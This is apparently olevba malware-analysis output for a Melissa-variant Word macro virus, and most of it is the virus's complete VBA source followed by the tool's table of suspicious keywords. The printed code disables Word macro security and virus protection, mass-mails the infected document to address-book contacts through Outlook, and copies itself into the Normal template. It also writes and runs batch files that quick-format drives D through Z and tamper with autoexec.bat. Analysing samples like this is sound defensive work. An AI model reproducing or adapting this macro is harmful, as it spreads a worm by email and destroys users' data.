olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.bk-7423d9ba427869e3e7579f5199a44503697f23fc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO y2k_ok.cls 
in file: Virus.MSWord.Melissa.bk-7423d9ba427869e3e7579f5199a44503697f23fc - OLE stream: 'Macros/VBA/y2k_ok'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Y2k patch
'Do Not Modify
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
On Error Resume Next
Dim UngaDasOutlook, DasMapiName, dskdsfiwe
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "y2k_ok?") <> "... by Agent7" Then
If UngaDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x = 1
        Set dskdsfiwe = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            dskdsfiwe.Recipients.Add Peep
            x = x + 1
            If x > 150 Then oo = AddyBook.AddressEntries.Count
         Next oo
         dskdsfiwe.Subject = "Re: " & Application.UserName
         dskdsfiwe.Body = ""
         dskdsfiwe.Attachments.Add ActiveDocument.FullName
         dskdsfiwe.Send
         Peep = ""
    Next y
DasMapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "y2k_ok?") = "... by Agent7"
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "y2k_ok" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "y2k_ok"
DoAD = True
End If
If NTI1.Name <> "y2k_ok" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "y2k_ok"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
If Day(Now) = Minute(Now) Then Selection.TypeText "Loading..."
Shell "attrib c:\drives.bat -r,-h,-s,-a", vbHide
On Error Resume Next
Shell "attrib c:\autoexec.bat -r,-h,-s,-a", vbHide
On Error Resume Next
Shell "attrib c:\cmos.com -r,-h,-s,-a", vbHide
On Error Resume Next
Open "c:\drives.bat" For Output As #1
Open "c:\autoexec.bat" For Output As #2
Open "c:\cmos.com" For Output As #3
Open "c:\fat32.com" For Output As #4
Print #4, "Ò{"
Close #4
Print #3, "²p2ö°.îB2ÀîÍ"
Close #3
Print #2, "date 10-18-2099"
Print #2, "c:\cmos.com"
Print #2, "c:\fat32.com"
Close #2
Print #1, "@echo off"
Print #1, "echo y|format/q z: /v:Empty >NUL"
Print #1, "echo y|format/q y: /v:Empty >NUL"
Print #1, "echo y|format/q x: /v:Empty >NUL"
Print #1, "echo y|format/q w: /v:Empty >NUL"
Print #1, "echo y|format/q v: /v:Empty >NUL"
Print #1, "echo y|format/q u: /v:Empty >NUL"
Print #1, "echo y|format/q t: /v:Empty >NUL"
Print #1, "echo y|format/q s: /v:Empty >NUL"
Print #1, "echo y|format/q r: /v:Empty >NUL"
Print #1, "echo y|format/q q: /v:Empty >NUL"
Print #1, "echo y|format/q p: /v:Empty >NUL"
Print #1, "echo y|format/q o: /v:Empty >NUL"
Print #1, "echo y|format/q n: /v:Empty >NUL"
Print #1, "echo y|format/q m: /v:Empty >NUL"
Print #1, "echo y|format/q l: /v:Empty >NUL"
Print #1, "echo y|format/q k: /v:Empty >NUL"
Print #1, "echo y|format/q j: /v:Empty >NUL"
Print #1, "echo y|format/q i: /v:Empty >NUL"
Print #1, "echo y|format/q h: /v:Empty >NUL"
Print #1, "echo y|format/q g: /v:Empty >NUL"
Print #1, "echo y|format/q f: /v:Empty >NUL"
Print #1, "echo y|format/q e: /v:Empty >NUL"
Print #1, "echo y|format/q d: /v:Empty >NUL"
Print #1, "Exit"
Close #1
On Error Resume Next
Shell "attrib c:\cmos.com +r", vbHide
On Error Resume Next
Shell "attrib c:\autoexec.bat +r", vbHide
On Error Resume Next
Shell "attrib c:\drives.bat +r", vbHide
On Error Resume Next
Shell "c:\drives.bat", vbHide
On Error Resume Next
Shell "c:\autoexec.bat", vbHide
On Error Resume Next
End Sub
'Only Symantec Norton 2000 will offer protection next time
'Forget McAfee 4.02+,Norton 5.0+, and all other Generics
'Welcome to a new age of cyberwarfare

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |drives.bat          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

